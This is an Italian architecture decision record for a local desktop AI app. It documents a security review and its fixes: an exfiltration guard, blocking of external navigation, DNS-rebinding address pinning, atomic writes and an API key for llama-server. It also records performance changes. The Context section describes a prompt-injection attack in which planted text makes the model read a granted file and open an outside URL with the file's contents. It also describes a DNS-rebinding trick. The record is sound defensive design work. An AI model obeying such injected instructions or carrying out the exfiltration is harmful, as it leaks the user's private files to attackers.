# 0011 — Revisione di sicurezza e prestazioni; protezioni che l'utente può spegnere

**Stato:** accettata e realizzata (14-11-2026). Integra l'[ADR 0007](0007-strumenti-e-permessi.md)
(strumenti e permessi) e l'[ADR 0010](0010-api-locale-e-vscode.md) (API locale) senza
cambiarne le decisioni. Provata con i test automatici e nell'app; il clic su un
collegamento dentro una risposta vera è provato solo in parte (vedi in fondo).

## Contesto

Una revisione del codice alla fine della Tappa 5 ha trovato due punti deboli di media
gravità, alcuni minori e qualche lentezza destinata a crescere con l'archivio:

1. **Fuga di dati tramite prompt injection.** In lettura gli strumenti partono senza
   conferma, anche con "Chiedi sempre". Con file e web accesi insieme, un testo malevolo
   (una pagina, un documento) poteva far leggere al modello un file concesso e poi
   fargli aprire `https://sito-altrui/?dati=<contenuto>`, senza che l'utente vedesse nulla.
   SI-5 impediva ai dati di concedersi permessi, non di uscire.
2. **Collegamenti nelle risposte.** Un clic su un link scritto dal modello caricava il
   sito esterno nella finestra dell'app, al posto dell'interfaccia (e con il suo aspetto:
   possibile phishing).
3. **DNS rebinding sulla lettura delle pagine.** Il nome del sito si risolveva una volta
   per il controllo "è pubblico?" e una seconda volta per il collegamento: un DNS malevolo
   poteva rispondere con un indirizzo pubblico e poi con `127.0.0.1`. Mancavano anche
   alcuni intervalli riservati (`0.0.0.0/8`, NAT64, 6to4, `::a.b.c.d`).
4. Minori: scritture dei file non atomiche, `edit_file` senza limite di dimensione, file
   da Hugging Face senza impronta accettati in silenzio, nonce della webview VS Code
   generato con `Math.random`.
5. Prestazioni: i comandi Tauri non `async` giravano sul thread dell'interfaccia (una
   ricerca o un'archivio grande bloccavano la finestra); SQLite senza WAL; ricerca nei
   messaggi con `LIKE '%…%'` su tutto il testo; immagini allegate (fino a 5 MB in base64)
   rilette a ogni apertura di una conversazione anche se l'interfaccia ne mostra solo il nome.

## Decisione

**Principio:** le protezioni che costano qualche conferma in più all'utente sono **accese
di base** e si possono **spegnere** nelle Impostazioni (sezione *Sicurezza*, salvate in
`settings.security`). Quelle che non costano nulla in qualità sono sempre attive.

### Protezioni disattivabili (`SecuritySettings`)

| Impostazione | Cosa fa | Perché si può spegnere |
|---|---|---|
| **Protezione dalla fuga di dati** (`exfiltrationGuard`) | `read_web_page` chiede conferma se il modello vede i file (strumenti sui file accesi e almeno una cartella concessa) e l'indirizzo **non** compare in un messaggio dell'utente né nei risultati di una ricerca della stessa conversazione. La richiesta lo spiega. | Chi naviga molto seguendo indirizzi "costruiti" dal modello riceve più domande |
| **Conferma prima di aprire i collegamenti** (`confirmLinks`) | Un collegamento in una risposta mostra l'indirizzo vero prima di aprirsi nel browser di sistema | Un clic in più per ogni link |

Dettagli della protezione dalla fuga di dati (`tools::needs_exfiltration_check`):

- vale solo per `read_web_page`: `web_search` manda le parole a DuckDuckGo, non a un sito
  scelto dal modello;
- non vale con "Consenti tutto" (il terminale potrebbe comunque far uscire qualunque
  cosa: l'utente ha già accettato quel rischio) né dopo "Consenti sempre" su quello
  strumento, che lo aggiunge agli `allowed_tools` della conversazione o della sessione;
- gli indirizzi "noti" si ricavano dalla cronologia (`known_urls`): testo dei messaggi
  dell'utente e risultati delle chiamate `web_search`; non quelli scritti in file o
  pagine lette, che potrebbero venire dall'attaccante;
- il confronto si fa sugli indirizzi normalizzati (`Url::parse`), quindi maiuscole nel
  nome del sito o barre finali non ingannano.

### Protezioni sempre attive

- **La finestra mostra solo l'app.** Un plugin del guscio (`navigation-guard`) rifiuta
  ogni navigazione fuori da `tauri://` / `tauri.localhost` (e dal server di Vite solo in
  sviluppo). I collegamenti si aprono con il comando `open_external`, che accetta solo
  `http`, `https` e `mailto` e usa `tauri-plugin-opener` dal lato Rust: l'interfaccia non
  ha il permesso di aprire file o programmi.
- **Collegamento all'indirizzo controllato.** `read_page` risolve il nome una volta sola,
  controlla gli indirizzi e li fissa nel client (`resolve_to_addrs`) per quella tappa;
  ogni rinvio ripete il controllo. Con un proxy di sistema è il proxy a risolvere il nome,
  come prima.
- **Intervalli riservati completati:** `0.0.0.0/8`, `::a.b.c.d`, `64:ff9b::/96` e
  `2002::/16` (che contengono un IPv4 e valgono quanto quello), `2001:db8::/32`.
- **Scritture atomiche:** `write_file` e `edit_file` scrivono un file temporaneo accanto
  all'originale e lo rinominano; se Windows nega la rinomina (file tenuto aperto da un
  altro programma) si scrive direttamente, come prima. `edit_file` rifiuta i file oltre
  20 MB, come `read_file`.
- **Impronta mancante dichiarata:** se Hugging Face non pubblica lo SHA-256 di un file,
  il download riesce (si controlla la dimensione) ma l'interfaccia lo dice
  (`DownloadState.unverified`).
- **Nonce della webview VS Code** da `crypto.randomBytes`.
- **Token dell'API locale:** resta in chiaro in `core.lock`, nella cartella dati
  dell'utente (`%APPDATA%`, leggibile solo da lui): è il modo in cui l'estensione lo trova.
  Le Impostazioni ora dicono chiaramente che chi ha il token può fare tutto ciò che fa
  l'app, agenti e terminale compresi.

### Prestazioni

- **Comandi Tauri fuori dal thread dell'interfaccia:** quelli che toccano l'archivio o il
  disco sono `#[tauri::command(async)]`; restano sincroni solo quelli che leggono la
  memoria (stato di un download, conferme, arresto).
- **SQLite in modalità WAL** con `synchronous=NORMAL` e attesa di 5 secondi sui blocchi:
  letture e scritture non si aspettano a vicenda. Accanto a `data.sqlite` compaiono
  `data.sqlite-wal` e `data.sqlite-shm`.
- **Indice di ricerca** (passo 6 dello schema): tabella FTS5 `messages_fts` con
  tokenizzatore `trigram`, tenuta aggiornata da trigger. Una ricerca di almeno tre
  caratteri usa l'indice e trova anche pezzi di parola, come prima; sotto i tre caratteri
  si usa ancora `LIKE`. All'aggiornamento l'indice si costruisce una volta sui messaggi
  esistenti.
- **Allegati leggeri per l'interfaccia:** `messages_for_display` legge degli allegati solo
  nome e tipo (con le funzioni JSON di SQLite); il contenuto si legge solo per mandarlo al
  modello. Usato dall'app e da `GET /api/conversations/{id}/messages`.

## Alternative scartate

| Alternativa | Motivo |
|---|---|
| Chiedere conferma per ogni lettura del web | Sicuro ma pesante: la ricerca seguita dalla lettura dei risultati, il caso più comune, chiederebbe ogni volta |
| Bloccare il web quando i file sono accesi | Toglie una combinazione utile (riassumere un file con fonti dal web) |
| Resolver DNS personalizzato che rifiuta gli indirizzi privati | Rifiuterebbe anche un proxy aziendale sulla rete locale; fissare gli indirizzi per richiesta ottiene lo stesso senza quel limite |
| Pool di connessioni SQLite | Con WAL il blocco unico basta per l'uso di una persona; da rivalutare se l'API locale avrà molti client insieme |
| Tabella separata per gli allegati | Richiede di spostare i dati esistenti; leggere solo nome e tipo con JSON ottiene quasi tutto il guadagno senza migrazione dei dati |

## Conseguenze

- Le richieste di conferma, gli avvisi e il registro mostrano testi nuovi; la loro
  traduzione inglese sta in `apps/desktop/src/locales/core-en.ts` ([ADR 0012](0012-lingue-interfaccia.md)).
- L'archivio cresce per l'indice a trigrammi (circa tre volte il testo dei messaggi).
- Provato nell'app: impostazioni salvate e rilette, lingua, blocco della navigazione
  esterna, rifiuto di `open_external` con un indirizzo `file:`. Il clic su un
  collegamento dentro una risposta vera di un modello non è stato provato fino in fondo
  (la prova è stata interrotta); è coperto dal codice di `MarkdownRenderer.tsx` e dal blocco
  della navigazione, provato a parte.

## Seconda revisione (14-11-2026)

Una seconda revisione ha trovato altri punti, corretti senza nuove impostazioni: nessuno
toglie qualità all'app, quindi non c'è nulla da rendere disattivabile.

- **PDF rovinati non chiudono più l'app.** `pdf-extract` va in panic con molti PDF
  insoliti; con `panic = "abort"` il panic chiudeva tutto il processo (chat, agenti, API
  locale), anche quando il modello leggeva un PDF di una cartella concessa senza conferma.
  Ora la lettura sta dentro `catch_unwind` (`files::pdf_text`) e il profilo di rilascio
  usa `panic = "unwind"` (eseguibile un po' più grande), senza il quale `catch_unwind`
  non funziona.
- **`llama-server` con chiave.** A ogni caricamento il nucleo sceglie una chiave casuale
  (`LoadedModel.api_key`, mai serializzata) e la passa nella variabile `LLAMA_API_KEY`,
  non tra gli argomenti, dove si leggerebbe nella riga di comando. Senza chiave qualunque
  programma del computer poteva usare il modello saltando token e controlli dell'API
  locale. Anche `--no-slots`: l'elenco degli slot non serve all'app. Provato: senza
  chiave `401`, con la chiave la risposta arriva; `/health` resta libero.
- **Tempi massimi verso internet.** Il client di provider, Hugging Face e GitHub ha 20 s
  per collegarsi e 10 minuti di attesa massima tra un pezzo di dati e l'altro. Nessun
  limite sull'intera richiesta: risposte e download lunghi continuano a funzionare. Prima
  un servizio che smetteva di rispondere lasciava la chat ferma per sempre.
- **Avviso della fuga di dati tradotto.** Nel testo mancava una `\` di fine riga: conteneva
  una ventina di spazi e la traduzione inglese non lo riconosceva mai.
- **Streaming più leggero.** L'interfaccia mostra il testo in arrivo ogni 60 ms invece che
  a ogni token: ridisegnare il Markdown (formule, codice evidenziato) a ogni pezzo costava
  un lavoro proporzionale al quadrato della lunghezza della risposta.
- **Disco fuori dal ciclo asincrono:** lettura degli allegati, impronta della parte già
  scaricata quando un download riprende (anche molti GB), e gli endpoint dell'API locale
  che usano l'archivio passano da `spawn_blocking`.
